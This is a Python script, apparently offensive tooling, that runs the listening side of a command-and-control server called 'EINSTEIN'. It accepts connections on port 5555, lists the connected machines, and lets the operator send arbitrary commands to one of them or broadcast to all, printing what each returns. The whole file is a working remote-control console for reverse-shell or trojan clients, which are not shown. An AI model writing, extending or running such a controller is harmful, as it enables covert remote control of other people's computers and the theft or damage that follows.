import socket
import threading
import os
from colorama import Fore
import ctypes

clients = {}  # Sockets e addresses btw

def logo():
    print(f"{Fore.GREEN}   _____ _           _       _ _   _ ")
    print(f"  |  ___(_)         | |     (_) \ | |")
    print(f"  | |__  _ _ __  ___| |_ ___ _|  \| |")
    print(f"  |  __|| | '_ \/ __| __/ _ \ | . ` |")
    print(f"  | |___| | | | \__ \ ||  __/ | |\  |")
    print(f"  \____/|_|_| |_|___/\__\___|_\_| \_/  {Fore.RESET}")

def handle_client(client_socket, addr):
    clients[addr] = client_socket

    if os.name == "nt":  # Windows-only function
        ctypes.windll.kernel32.SetConsoleTitleW(f"EINSTEIN | CLIENTS: {len(clients)}")
    
    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Client {addr[0]} Desconectado.")
    client_socket.close()
    del clients[addr]

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))  # Fixed bind issue
    server.listen(5)
    print(f"[!!!] {host}:{port}")

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("clear")
    logo()
    print("[...] Esperando conexão...")

    while True:
        if not clients:
            continue

        print("\n[Usuarios Conectados]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        try:
            choice = int(input("Selecionar o nmr do Usuario ou 0 para seguir com broadcast:")) - 1
        except ValueError:
            continue

        if choice == -1:
            command = input("Comando (broadcast):")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]  # Fixed indexing issue
            command = input(f"Commando para enviar para {target_addr[0]}: ")
            clients[target_addr].send(command.encode())
        else:
            print("[!!! Invalido.]")

if __name__ == "__main__":
    start_server()
